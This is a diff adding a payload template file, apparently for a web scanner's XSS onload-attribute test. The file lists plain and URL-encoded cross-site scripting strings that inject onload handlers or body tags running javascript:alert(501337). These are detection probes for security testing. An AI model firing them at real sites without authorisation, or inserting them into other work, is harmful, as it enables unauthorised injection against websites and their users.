@@ -1,0 +1,16 @@
+;template file for XssTestAttributeOnLoad payload
+;comments start with semicolon
+;payloads should be added line by line
+"+onload="javascript:alert(501337)
+%22+onload%3d%22javascript:alert(501337)%22
+'+onload='javascript:alert(501337)'
+%27+onload%3d%27javascript:alert(501337)%27
+'"%3E%3CbODy%20onload=javascript:alert(501337)%3E%3C/bODy%3E
+%3CbODy%20onload=%22javascript:alert(501337)%22%3E%3C/bODy%3E
+%3CbODy%20onload='javascript:alert(501337)'%3E%3C/bODy%3E
+--%3E%3CbODy%20onload=javascript:alert(501337)%20%3E%3C/bODy%3E
+'%22%3E%3Cbody%20onload=javascript:alert(501337)%3E%3C/body%3E
+%3Cbody%20onload=%22javascript:alert(501337)%22%3E%3C/body%3E
+%3Cbody%20onload='javascript:alert(501337)'%3E%3C/body%3E
+--%3E%3Cbody%20onload=javascript:alert(501337)%20%3E%3C/body%3E
+%3Cbody%20onload='javascript:alert(501337)'%20%3E
